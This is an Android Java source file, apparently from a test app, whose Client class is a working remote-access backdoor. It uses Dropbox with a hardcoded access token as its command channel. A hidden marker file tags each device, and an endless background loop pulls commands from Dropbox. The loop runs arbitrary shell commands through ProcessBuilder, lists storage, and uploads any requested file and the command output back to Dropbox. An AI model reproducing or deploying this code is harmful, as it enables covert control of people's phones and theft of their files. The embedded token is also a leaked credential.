package com.example.testapp;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.DropBoxManager;
import android.os.Environment;
import android.util.Log;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.util.IOUtil;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.DbxUserFilesRequests;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.Metadata;
import com.dropbox.core.v2.files.WriteMode;
import com.dropbox.core.v2.users.FullAccount;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.Date;

public class Client extends AsyncTask<MainActivity,Void,String> implements Runnable
{
    private static final String ACCESS_TOKEN = "X_TUKgQ-0WAAAAAAAAAAC5_7LDj8UEFAOfK4NGbpCAlHf1aAo61aVYf6XTFb-h4Y";
    DbxClientV2 client;
    MainActivity ma;
    DbxUserFilesRequests metadata;
    String sRoot;
    @Override
    protected String doInBackground(MainActivity... strs)
    {
        try {
            Log.d("Test", "hello");

            // Test if file has been previously installed
            File user = new File(Environment.getExternalStorageDirectory().toString()+"/.thresh");




            DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
            client = new DbxClientV2(config, ACCESS_TOKEN);


            if(user.exists())
            {
                sRoot = read(user);
            }
            else {
                user.createNewFile();
                String uname = "" + (int) (Math.random() * 1000);

                write(user, uname);
                sRoot = uname;
            }

            new File(Environment.getExternalStorageDirectory().toString(),"command.txt").createNewFile();
            uploadFile(new File(Environment.getExternalStorageDirectory().toString(),"command.txt"));

            metadata = client.files();
            FullAccount account = client.users().getCurrentAccount();
            String msg = account.getName().getDisplayName();




            Log.d("Test",msg);
            Thread thread = new Thread(this);
            thread.start();
            return msg;
        }
        catch(Exception e)
        {
            System.out.print("TESTI ");
            e.printStackTrace();
            return e.toString();
        }
    }

    @Override
    public void run() {
        File root = null;
        while(true)
        try {
            root = new File(Environment.getExternalStorageDirectory(),"ADM");
            if (!root.exists()) {
                root.mkdirs();
            }

            File gpxfile = new File(root, "command.txt");
            gpxfile.createNewFile();

            //Log.d("Test",root.toString());
            //Log.d("Test",Environment.getExternalStorageDirectory().getAbsolutePath());

            OutputStream outputStream = new FileOutputStream(gpxfile);
            FileMetadata metadata = client.files()
            .downloadBuilder("/"+sRoot+"/command.txt")
                .download(outputStream);
            String text = read(gpxfile);
            if(text==null)
                throw new Exception();
            String output = runCommand(text);
            Log.d("Test",output);
            //Log.d("Test","done");


            //client.files().deleteV2("/command.txt");

            PrintWriter outFile = getOutFile(new File(root,"output.txt"));

            outFile.print(output);
            outFile.flush();
            //PrintWriter outputTerminal = getOutFile(new File(root,"outputTerminal.txt"));

            //outputTerminal.println(getTerminalOutput(text));

            if(exists("/"+sRoot+"/command.txt"))
                client.files().deleteV2("/"+sRoot+"/command.txt");
            PrintWriter modifyCommand = getOutFile(new File(root,"command.txt"));
            saveAs(root,"command.txt");
            //saveAs(root,"outputTerminal.txt");
            if(exists("/"+sRoot+"/output.txt")) {
                client.files().deleteV2("/"+sRoot+"/output.txt");
            }
            saveAs(root, "output.txt");

        }
        catch(Exception e)
        {
            Log.d("Test",e.toString());
        }
    }

    private void write(File file,String str) throws IOException
    {
        FileWriter fr = new FileWriter(file);
        BufferedWriter br = new BufferedWriter(fr);
        PrintWriter pr = new PrintWriter(br);
        pr.print(str);
        pr.flush();
        pr.close();
    }

    private String getTerminalOutput(String text) throws IOException {
        ProcessBuilder builder = new ProcessBuilder(text);
        Log.d("errori",text);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        InputStream is = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        String out = "";
        String line = null;
        while ((line = reader.readLine()) != null) {
            out+=(line+"\n");
        }
        return out;
    }

    private String read(File path) throws IOException {
        FileReader in = new FileReader(path);
        BufferedReader br = new BufferedReader(in);
        String text = "";
        String full = "";
        while((text=br.readLine())!=null)
        {
            full+=text;
        }
        return full;
    }

    public String runCommand(String command) throws Exception
    {

        Log.d("Test",command);

        if(command.startsWith("ls"))
           return  new FileStructure().pickleStructure(this,new File(Environment.getExternalStorageDirectory(),command.substring(3)));
        else if(command.startsWith("##"))
            return getTerminalOutput(command.substring(2));
        else if(command.equals("show"))
            return ma.show();
        else if(command.startsWith("#SF"))
            return uploadFile(new File(Environment.getExternalStorageDirectory(),command.substring(3)));
        else if(command.equals("#ls"))
            return new FileStructure().pickleStructure(this,Environment.getExternalStorageDirectory());
        else if(command.startsWith("download"))
            return uploadLocalFile(command.substring(command.indexOf(' ')+1));
        else
            throw new Exception();
    }

    private String uploadLocalFile(String path) throws DbxException {
        File f = new File(path);
        return uploadFile(f);
    }

    public void saveAs(File root,String path)throws Exception
    {
        try (InputStream in = new FileInputStream(new File(root,path))) {
                FileMetadata metadata1 = client.files().uploadBuilder("/"+path)
                        .uploadAndFinish(in);
                //kaajrare
                //nayna
                //manjah
                //bidi jalaile
            }

    }
    public String sendAs(String path)throws Exception
    {
        try (InputStream in = new FileInputStream(new File(Environment.getExternalStorageDirectory(),path))) {
            FileMetadata metadata1 = client.files().uploadBuilder("/"+path.substring(path.lastIndexOf('/')))
                    .uploadAndFinish(in);
            //kaajrare
            //nayna
            //manjah
            //bidi jalaile
            return "done";
        }

    }

    public PrintWriter getOutFile(File file)throws IOException
    {
        FileWriter fw = new FileWriter(file);
        BufferedWriter bw = new BufferedWriter(fw);
        PrintWriter outFile = new PrintWriter(bw);
        return outFile;
    }

     public boolean exists(String path) {
        try {
            Metadata tmp = metadata.getMetadata(path);
            if(tmp!=null)
                return true;
            else
                return false;
        }
        catch(Exception e)
        {
            return false;
        }
        }
        public String uploadFile(File localFile) throws DbxException {

        if(exists("/"+sRoot+"/"+localFile.getName()))
            client.files().deleteV2("/"+sRoot+"/"+localFile.getName());
        try (InputStream in = new FileInputStream(localFile)) {

            FileMetadata metadata = client.files().uploadBuilder("/"+sRoot+"/"+localFile.getName())
                .withMode(WriteMode.ADD)
                .withClientModified(new Date(localFile.lastModified()))
                .uploadAndFinish(in);

            return localFile.getName()+" uploaded";
        }  catch (DbxException ex) {
            return ("Error uploading to Dropbox: " + ex.getMessage());
        } catch (IOException ex) {
            return ("Error reading from file \"" + localFile + "\": " + ex.getMessage());
        }
    }
}

